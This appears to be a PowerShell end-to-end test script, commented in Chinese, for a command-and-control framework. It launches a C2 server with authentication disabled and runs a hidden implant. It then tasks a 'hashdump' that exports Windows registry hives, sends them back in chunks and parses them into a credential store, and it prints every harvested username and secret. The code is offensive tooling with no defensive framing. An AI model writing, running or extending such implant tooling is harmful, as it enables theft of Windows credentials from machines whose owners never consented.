# csdev :: hashdump_e2e.ps1  --  hashdump 端到端回归
#
# 起服务端 + 植入体 -> 上线 -> 压 sleep -> 下发 hashdump -> 等导出/回传/解析 -> 校验凭据库
#
# 与 e2e_v2.ps1 的区别: hashdump 是"一条命令触发三步链路"(导出 -> 分块回传 -> 离线解析),
# 结果不是普通命令回显而是异步落库, 所以需要单独的等待与校验逻辑。
[CmdletBinding()]
param(
    [string] $Host_    = '127.0.0.1',
    [int]    $Port     = 8443,
    [string] $Implant  = '',
    [int]    $WaitSec  = 60,
    [int]    $TimeoutSec = 300
)

$ErrorActionPreference = 'Stop'
$DevDir   = Split-Path -Parent $PSScriptRoot
$Server   = Join-Path $DevDir 'go\csdev-server.exe'
$LogDir   = Join-Path $DevDir 'build\e2e'
if (-not $Implant) { $Implant = Join-Path $DevDir 'build\payload2.exe' }
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
$base     = "http://${Host_}:${Port}"
$serverProc = $null
$implantProc = $null

function Say($m, $c = 'Gray') { Write-Host $m -ForegroundColor $c }

function Decode-B64([string]$b64) {
    try {
        $b = [Convert]::FromBase64String($b64)
        try { return (New-Object System.Text.UTF8Encoding($false, $true)).GetString($b) }
        catch { return [System.Text.Encoding]::GetEncoding(936).GetString($b) }
    } catch { return $b64 }
}

try {
    Get-Process -Name 'payload2', 'csdev-server' -ErrorAction SilentlyContinue |
        ForEach-Object { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue }
    Start-Sleep -Milliseconds 600

    $srvArgs = @('--host', $Host_, '--port', "$Port", '-auth=off')
    $serverProc = Start-Process -FilePath $Server -ArgumentList $srvArgs -PassThru `
        -WorkingDirectory $DevDir -WindowStyle Hidden `
        -RedirectStandardOutput (Join-Path $LogDir 'hd_server.out.log') `
        -RedirectStandardError  (Join-Path $LogDir 'hd_server.err.log')
    Say "[*] 服务端 pid=$($serverProc.Id)  $base" 'DarkGray'

    $ready = $false
    for ($i = 0; $i -lt 40; $i++) {
        Start-Sleep -Milliseconds 400
        try { $null = Invoke-RestMethod "$base/api/state" -TimeoutSec 2; $ready = $true; break } catch { }
    }
    if (-not $ready) { Say '[x] 服务端未就绪' 'Red'; exit 2 }

    $implantProc = Start-Process -FilePath $Implant -PassThru -WindowStyle Hidden
    Say "[*] 植入体 pid=$($implantProc.Id)" 'DarkGray'

    $sid = ''
    $deadline = (Get-Date).AddSeconds($WaitSec)
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Milliseconds 700
        try {
            $st = Invoke-RestMethod "$base/api/state" -TimeoutSec 3
            $v2 = @($st.sessions | Where-Object { $_.proto -eq 'v2' })
            if ($v2.Count -gt 0) { $sid = $v2[0].sid; break }
        } catch { }
    }
    if (-not $sid) { Say '[x] 会话未上线' 'Red'; exit 2 }
    Say "[v] 会话 $sid" 'Green'

    # 把 beacon 周期压到 200ms: 28MB 的 SYSTEM hive 要 54 块, 5 秒周期下要 4 分半
    $null = Invoke-RestMethod -Method Post -Uri "$base/api/command" `
            -Body (@{ sid = $sid; cmd = 'sleep 200 0' } | ConvertTo-Json -Compress) `
            -ContentType 'application/json' -TimeoutSec 5
    Start-Sleep -Seconds 2
    Say '[*] sleep 已压到 200ms' 'DarkGray'

    $before = @((Invoke-RestMethod "$base/api/output?sid=$sid&since=0").items)
    $maxTs = 0L
    foreach ($it in $before) { if ([long]$it.ts -gt $maxTs) { $maxTs = [long]$it.ts } }
    $since = ($maxTs + 1).ToString()

    Say '>>> hashdump' 'Cyan'
    $resp = Invoke-RestMethod -Method Post -Uri "$base/api/command" `
            -Body (@{ sid = $sid; cmd = 'hashdump' } | ConvertTo-Json -Compress) `
            -ContentType 'application/json' -TimeoutSec 10
    Say ("    下发响应: " + ($resp | ConvertTo-Json -Compress)) 'DarkGray'

    $done = $false
    $allLines = @()
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    $lastLen = 0
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds 2
        try {
            $items = @((Invoke-RestMethod "$base/api/output?sid=$sid&since=$since" -TimeoutSec 5).items)
            if ($items.Count -gt 0) {
                $txt = @($items | ForEach-Object { Decode-B64 $_.text })
                $joined = ($txt -join '')
                if ($joined.Length -ne $lastLen) { $lastLen = $joined.Length }
                if ($joined -match 'hashdump 完成' -or $joined -match 'hashdump 失败' -or $joined -match 'hashdump 解析失败') {
                    $allLines = $txt
                    $done = $true
                    break
                }
            }
        } catch { }
        # 进度提示
        $el = [int]((Get-Date) - $deadline.AddSeconds(-$TimeoutSec)).TotalSeconds
        if ($el % 30 -lt 2) { Say "    ... 等待中 ${el}s" 'DarkGray' }
    }

    Say '' 
    if (-not $done) { Say "[x] ${TimeoutSec}s 内未完成 hashdump" 'Red' }
    else {
        Say '[v] hashdump 输出:' 'Green'
        foreach ($l in $allLines) {
            $ls = $l -split "`r?`n" | Where-Object { $_.Trim().Length -gt 0 }
            foreach ($x in $ls) { Say "    $x" 'DarkGray' }
        }
    }

    Say ''
    Say '[*] 凭据库 (/api/credentials, 只看 hashdump 来源):' 'White'
    $creds = @((Invoke-RestMethod "$base/api/credentials" -TimeoutSec 5).credentials)
    $hd = @($creds | Where-Object { $_.source -eq 'hashdump' })
    foreach ($c in $hd) {
        Say ("    CredK={0}  {1}  {2}  sid={3}" -f $c.cred_kind, $c.user, $c.secret, $c.sid) 'DarkGray'
    }
    Say ("    合计 {0} 条" -f $hd.Count) 'White'

    Say ''
    Say '[*] 下载库里的 hive:' 'White'
    $dls = @((Invoke-RestMethod "$base/api/downloads" -TimeoutSec 5).downloads)
    foreach ($d in $dls) {
        if ($d.name -like 'csdev_*.hiv') {
            Say ("    {0}  {1} 字节  {2}" -f $d.name, $d.size, $d.path) 'DarkGray'
        }
    }

    if ($done) { exit 0 } else { exit 3 }

} finally {
    if ($implantProc -and -not $implantProc.HasExited) { Stop-Process -Id $implantProc.Id -Force -ErrorAction SilentlyContinue }
    if ($serverProc -and -not $serverProc.HasExited) { Stop-Process -Id $serverProc.Id -Force -ErrorAction SilentlyContinue }
}
